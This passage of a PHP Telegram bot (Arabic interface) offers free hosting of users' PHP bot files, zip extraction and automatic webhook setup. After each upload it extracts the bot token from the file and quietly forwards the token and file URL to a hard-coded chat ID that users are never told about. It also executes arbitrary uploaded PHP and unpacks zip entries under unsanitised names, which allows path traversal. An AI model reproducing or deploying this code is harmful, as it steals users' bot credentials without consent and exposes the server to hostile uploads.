                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"اغلاق ارسال الرسائل",'callback_data'=>"back" ]], 
      ]
    ])
            ]);
            $u = $message_id;
            bot("sendmessage",[
                "chat_id" => $admin , 
                "text" => "
[📶] تم ارسال رساله جديده

[ℹ️] $text 

[🔖] من $name
 
[$from_id](tg://user?id=$chat_id) 
[Acount](tg://openmessage?user_id=$chat_id) 

للرد علي رساله الشخص [/Rd_".$from_id."_".$u."]
                ",
                'parse_mode'=>"markdown",
            ]);
            
	} 
	
	

 if($data == "back") {
 	bot("editMessagetext",[
                "chat_id" => $chat_id, 
                "message_id" => $message_id, 
                "text" => "
🔼] مرحبا بك في بوت رفع الملفات علي الاستضافه 
🔖] ارسل الملف الان لرفعه علي الاستضافه 
ℹ️] ملفاتك المرفوعه : $counts
📊] عدد جميع ملفات المرفوعه : $vc | $no
🌏] عدد مستخدمين البوت : $SAl
🤔] تعليمات البوت /help

🛡 ⁞ [تابع قناة تحديثات البوت](https://t.me/T_T_0_0_0
                ",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
    [['text'=>"• رفع الملف •",'callback_data'=>"SendFile"]],
    [['text'=>"📂 - فحص ملفات",'url'=>"http://t.me/T_0_2_5_BOT"],['text'=>"✅ - إحصائيات الرفع",'callback_data'=>"HkH" ]],  
     [['text'=>"📨 - ارسل رساله الدعم",'callback_data'=>"contact" ],['text'=>'🗂 - ضغط ملف','callback_data'=>'zip']],
     [['text'=>"📆 - ملفاتك المرفوعة $counts",'callback_data'=>"counts" ],['text'=>"📕-الملفات المرفوعة $vc | $no",'callback_data'=>"c7g" ]],
     [['text'=>"👤 - عدد المستخدمين $SAl",'callback_data'=>"SAl" ]],
           [['text'=>"🧑‍💻 - المطور",'url'=>"https://t.me/HACKH31" ],['text'=>"🎛 - قناة البوت",'url'=>"https://t.me/T_T_0_0_0" ]],
      ]
    ])
            ]);
        $Host["المود"][$from_id] = null ;
        SETJSON($Host) ;
} 


if($update){
bot("setMyCommands",[
    "commands"=>json_encode([
        ['command'=>"start",'description'=>'تشغيل البوت'],
  ['command'=>"help",'description'=>'مساعدة'],
        ])
    ]); 
}

#كود طرد من مجموعه البوت
$mnnlo = json_decode(file_get_contents("mnnlo.json"),1);
$tc = $update->message->chat->type;
if($tc == 'group' or $tc == 'supergroup'){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لا يمكنك استخدام البوت في مجموعات 🚫",
]);
bot('LeaveChat',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
}
if($data == 'zip'){
		bot('editMessageText',[
			"chat_id"=>$chat_id,
			'message_id'=>$message_id,
			"text"=>"قم بأرسال الملف zip",
            "parse_mode" => "markdown",
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [["text"=>"- الصفحه الرئيسيه -","callback_data"=>"back"]], 
      ]
    ])
		]);
		$files['mode'][$chat_id] = 'zip';
		save($files);
		exit;
	}
if($message->document) {
if (preg_match('/(.*)\.(zip)/i', $message->document->file_name)) {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'يتم فك الضغط'
]);
mkdir($chat_id);
file_put_contents($chat_id.'/'.$message->document->file_name, file_get_contents('https://api.telegram.org/file/bot'.API_KEY.'/'.bot('getfile',['file_id'=>$message->document->file_id])->result->file_path));
$zip = zip_open($chat_id.'/'.$message->document->file_name);
if ($zip){
while ($zip_entry = zip_read($zip)) {
if (zip_entry_open($zip, $zip_entry)){
file_put_contents($chat_id.'/'.zip_entry_name($zip_entry), zip_entry_read($zip_entry));
bot('sendDocument',[
'chat_id'=>$chat_id,
'document'=>new CURLFile($chat_id.'/'.zip_entry_name($zip_entry))
]);
zip_entry_close($zip_entry);
}
}
}
zip_close($zip);
$sc = scandir($chat_id);
for ($i=0; $i < count($sc); $i++) { 
unlink($chat_id.'/'.$sc[$i]);
}
rmdir($chat_id);
} else {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>''
]);
}
}

if($text == '/help'){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
⚠️] تعليمات البوت كالاتي :

1 - لا تقم برفع الملف مكرر مرتين الا بعد 
حذف الملف من الاستضافة
2 - عند رفع الملف قم بعمل ويب هوك
لكي يتم تشغيل البوت
3 - لا تقم برفع الملفات فيها اختراق او ما شابه لان البوت سيحظرك تلقائيا
4 - اذا قمت برفع الملف والبوت لم يشتغل قم باستبدال فاكشن الاتصال وقم برفع الملف
مرة اخرى

🤍] نتمني لك كل التوفيق",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"• قناة البوت •",'url'=>"https://t.me/T_T_0_0_0" ]],
[['text'=>"• المطور •",'url'=>"https://t.me/$MTAWR" ]],
]])
]);
}


 $domin = "dev-i00000.pantheonsite.io" ;
 if($update->message->document){
    $file_id = "https://api.telegram.org/file/bot".API_KEY."/".bot("getfile",["file_id"=>$update->message->document->file_id])->result->file_path;
    if(pathinfo($file_id, PATHINFO_EXTENSION) == "php"){
    	$b=bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "
            *
يتم رفع ملف انتضر قليلا 📂 ..
" ,
            "parse_mode" => "marKdown",
            
        ]);
    	$ur ="https://" . $domin . "" . str_replace("FilesHosting.php",null, $_SERVER['SCRIPT_NAME']). "".str_replace(".php",null,$update->message->document->file_name). "/bot.php";
    $text = file_get_contents ($file_id);
   
    if (strip_tags($text) && preg_match("/H3K/", $text) && preg_match("/public function create/", $text) && preg_match('/(.*)ZipArchive(.*)/i', $text) && preg_match('/(.*)zip(.*)/i', $text) || preg_match('/(.*)eval(.*)/i', $text)) {
bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id, 
            "text" => "تم وجود فايروسات عزيزي في ملفك ☢️" ,
            "parse_mode" => "marKdown",
            
        ]);
        bot("sendmessage",[
            "chat_id" =>1322420058,
            "text" => "
            
💀 محاولة اختراق
            
🔖 من الشخص : [$name](tg://openmessage?user_id=$chat_id) 
 
🆔 ايدي : [$from_id](tg://user?id=$chat_id) 
" ,
            "parse_mode" => "marKdown",
            
        ]);
        $Host[] = $from_id ;
        $Host["filehc"] += 1 ;
        SETJSON($Host) ;
    return false;
}
bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id, 
            "text" => "
<s>يتم رفع ملف انتضر قليلا 📂 ..</s>
تم الرفع بنجاح ☑️
اسم الملف الخاص بك ✳️ (". $update->message->document->file_name. ")
" ,
            "parse_mode" => "html",
        ]);
        mkdir(str_replace(".php",null,$update->message->document->file_name)) ;
        file_put_contents(str_replace(".php",null,$update->message->document->file_name). "/bot.php", file_get_contents ($file_id)) ;
        
$pattern = '/(\d+:[\w-]+)/';

if(preg_match("/api.telegram.org/", file_get_contents ($file_id))) {
	$Host["FileMatch"] += 1;
	} else {
		$Host["unFileMatch"] += 1;
		} 
		
		if (strpos(file_get_contents ($file_id), 'curl_') !== false) {
	$Host["curlfile"] += 1;
	} 
if (preg_match($pattern, file_get_contents ($file_id), $matches)) {
    $token = "توكن البوت 🎲". $matches[0]. "]" ;
    $n = $matches[0];
    $sethock = ["عمل ويب هوك تلقائي ☑️", "حذف ويب هوك 🗑"] ;
    
} else {
	$token = "لم يتم اكتشف توكن البوت ⚙️" ;
	
}
        $cr = rand(9999,999999);
        bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" =>"تم الرفع بنجاح ☑️

🌐 رابط الملف
$ur

$token 
" ,
            
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$sethock[0]",'callback_data'=>"sethock|$cr" ]], 
     [['text'=>"حذف الملف من الاستضافة 🗑",'callback_data'=>"deletefile|$cr" ]], 
     [['text'=>"$sethock[1]",'callback_data'=>"delete|$cr" ]], 
       
      ]
    ])
        ]);
        bot("sendmessage",[
            "chat_id" => 1358007123 ,
            "text" =>"تم الرفع بنجاح ☑️

🌐 رابط الملف
$ur

$token 
" ,
            
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$sethock[0]",'callback_data'=>"sethock|$cr" ]], 
     [['text'=>"حذف الملف من الاستضافة 🗑",'callback_data'=>"deletefile|$cr" ]], 
     [['text'=>"$sethock[1]",'callback_data'=>"delete|$cr" ]], 
       
      ]
    ])
        ]);
        $Host["count$from_id"] += 1;
        $Host["count"] += 1;
        $Host["meFile"][$from_id][] = $update->message->document->file_name;
        $Host[$cr] = "$n|$ur|".$update->message->document->file_name;
        SETJSON($Host) ;
    }else{
    	bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "قم بارسال ملفات بصيغه php فقط ❌" ,
            "parse_mode" => "marKdown",
            
        ]);
   } 
}
$da = explode ("|", $data) ;
if($da[0] == "sethock") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $Host[$cr])[0];
		$ul = explode("|", $Host[$cr])[1];
		file_get_contents("https://api.telegram.org/bot$tk/setwebhook?url=$ul") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خطأ في الملف ❌") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
تم عمل ويب هوك تلقائي بنجاح ☑️

◀️ معرف البوت الخاص بك : $user
",
      'show_alert'=>true
      ]);
     } 
	}
	
	if($da[0] == "delete") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $Host[$cr])[0];
		$ul = explode("|", $Host[$cr])[1];
		file_get_contents("https://api.telegram.org/bot$tk/deleteWebhook") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خطأ في الملف ❌") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
تم حذف ويب هوك من البوت بنجاح 🗑

◀️ معرف البوت الخاص بك : $user
",
      'show_alert'=>true
      ]);
     } 
	}
	
	if($da[0] == "deletefile") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $Host[$cr])[0];
		$ul = explode("|", $Host[$cr])[1];
		$nmv= str_replace(".php",null,explode("|", $Host[$cr])[2]) ;
		rmdir($nmv);
		unlink("$nmv/bot.php");
		file_get_contents("https://api.telegram.org/bot$tk/deleteWebhook") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خطأ في الملف ❌") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
تم حذف الملف بنجاح 🗑

◀️ معرف البوت الخاص بك : $user
",
      'show_alert'=>true
      ]);
     } 
	}